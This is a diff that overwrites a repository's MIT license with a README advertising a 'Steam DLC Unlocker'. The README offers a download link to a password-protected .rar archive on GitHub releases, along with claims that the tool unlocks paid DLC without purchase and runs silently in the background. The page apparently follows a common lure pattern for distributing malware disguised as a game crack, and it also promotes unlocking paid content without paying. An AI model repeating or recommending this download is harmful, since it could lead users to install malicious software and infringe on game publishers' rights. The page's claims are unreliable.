@@ -1,21 +1,25 @@
-MIT License
+  ____ _____ _____    _    __  __      ____  _     ____ 
+ / ___|_   _| ____|  / \  |  \/  |    |  _ \| |   / ___|
+ \___ \ | | |  _|   / _ \ | |\/| |    | | | | |  | |    
+  ___) || | | |___ / ___ \| |  | |    | |_| | |__| |___ 
+ |____/ |_| |_____/_/   \_\_|  |_|    |____/|_____\____|
+                                                        
 
-Copyright (c) 2026 wor-xevilxcnsa
+Steam Dlc Unlocker is a lightweight utility for PC gamers that instantly reveals and activates hidden Steam DLCs, letting owners reclaim missed content without extra purchases, boosting game value and enjoyment.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+*******************************
+      DOWNLOAD INFORMATION
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+DOWNLOAD LINK: https://github.com/wor-xevilxcnsa/steam-dlc-unlocker-2026/releases/download/new/SteamDLCUnlocker-9.3-x64.rar
+ARCHIVE PASSWORD: 8834
+*******************************
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Core Capabilities
+- Auto‑detects all owned Steam titles and scans for locked DLC entries.
+- One‑click activation restores missing content without requiring re‑purchase.
+- Minimal footprint: runs silently in the background, no admin rights needed.
+- Compatibility with Steam’s latest client updates and all major Windows versions.
+- Simple UI with log output for verification and troubleshooting.
+
+TAGS
+steam, dlc, unlocker, game-mod, cheat, grey-market, windows, utility
